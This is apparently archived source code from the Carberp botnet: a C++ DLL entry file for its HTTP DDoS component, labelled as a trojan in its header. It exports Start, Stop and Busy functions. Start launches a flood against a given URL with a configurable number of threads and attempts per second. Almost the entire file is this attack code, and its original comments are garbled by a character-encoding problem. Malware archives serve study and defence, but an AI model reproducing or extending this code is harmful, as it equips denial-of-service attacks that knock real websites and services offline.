/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
// dllmain.cpp: ���������� ����� ����� ��� ���������� DLL.
#include <windows.h>

#include "Main.h"
#include "GetApi.h"
#include "Strings.h"
#include "DDOSClasses.h"


//#pragma comment(linker, "/ENTRY:DDOSDllMain" )


// ���������� ������ ���
TDDOS *DDOS = NULL;  // ����� �����



//----------------------------------------------------------------------
//  StartHTTP - ������� ��������� HTTP DDOS �����
//
//  URL - ����� ���������� �����

//  Threads - ���������� ������� �����
//  
//  AttemptsPerSecond - ���������� ���� � ������� � ������ ������
//
//  Flags - ���������������
//
// ��������� - � ������ ������ ������� ���������� 0, � ��������� ������
//             ������ ���������� ��� ������
//----------------------------------------------------------------------
 int WINAPI Start(char* URL, DWORD Threads, DWORD AttemptsPerSecond, DWORD Flags)
{
	InitializeAPI();
	if (DDOS) return 1;
		

	if (STRA::IsEmpty(URL)) return 2;
			
	
	DDOS = new TDDOS();


	DDOS->URL = URL;

	if (Threads)
		DDOS->MaxThreads = Threads;

	
	if (AttemptsPerSecond)
		DDOS->AttemptsPerSecond = AttemptsPerSecond;

	// ��������� �����
	BOOL R = DDOS->Execute(false);

	return (R) ? 0 : -1;
}



void WINAPI Stop()
{
	if (DDOS)
	{
		TDDOS *TMP = DDOS;
		DDOS = NULL;
		TMP->Terminate();
	}
}

BOOL WINAPI Busy()
{
	return (DDOS) ? DDOS->Busy() : FALSE;
}





BOOL APIENTRY DDOSDllMain( HMODULE hModule,
                           DWORD  ul_reason_for_call,
                           LPVOID lpReserved)
{
	return TRUE;
}


